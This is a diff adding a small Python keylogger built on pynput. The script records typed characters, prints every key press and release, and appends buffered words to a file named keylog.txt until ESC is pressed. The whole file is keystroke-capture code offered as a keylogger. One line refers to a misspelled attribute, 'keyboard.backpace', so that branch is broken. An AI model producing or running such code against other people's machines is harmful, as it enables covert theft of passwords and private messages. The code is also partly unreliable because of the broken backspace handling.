@@ -1,0 +1,44 @@
+
+from pynput import keyboard
+
+log_file = "keylog.txt"
+buffer = []
+
+def flush_buffer(event_type):
+    global buffer
+    word = ''.join(buffer)
+    if word:
+        print(f"{event_type}: {word}")
+        with open(log_file, "a", encoding="utf-8") as file:
+            file.write(f"{event_type}: {word}\n")
+        buffer = []  # Clear the buffer
+
+def on_press(key):
+    global buffer
+    try:
+        print(f"Pressed: {key}")
+
+        if key.char.isprintable():
+            buffer.append(key.char)
+    except AttributeError:
+        # Handle special keys
+        if key == keyboard.Key.space or key == keyboard.Key.enter:
+            flush_buffer("Pressed")
+        elif key == keyboard.backpace:
+            if buffer:
+                buffer.pop()
+
+def on_release(key):
+    print(f"Released: {key}")
+
+    if key == keyboard.Key.esc:
+        flush_buffer("Released")
+        print("ESC pressed. Exiting keylogger...")
+        return False
+    # Optional: flush on Enter release
+    elif key == keyboard.Key.enter:
+        flush_buffer("Released")
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    print("Keylogger started... Press ESC to stop.")
+    listener.join()
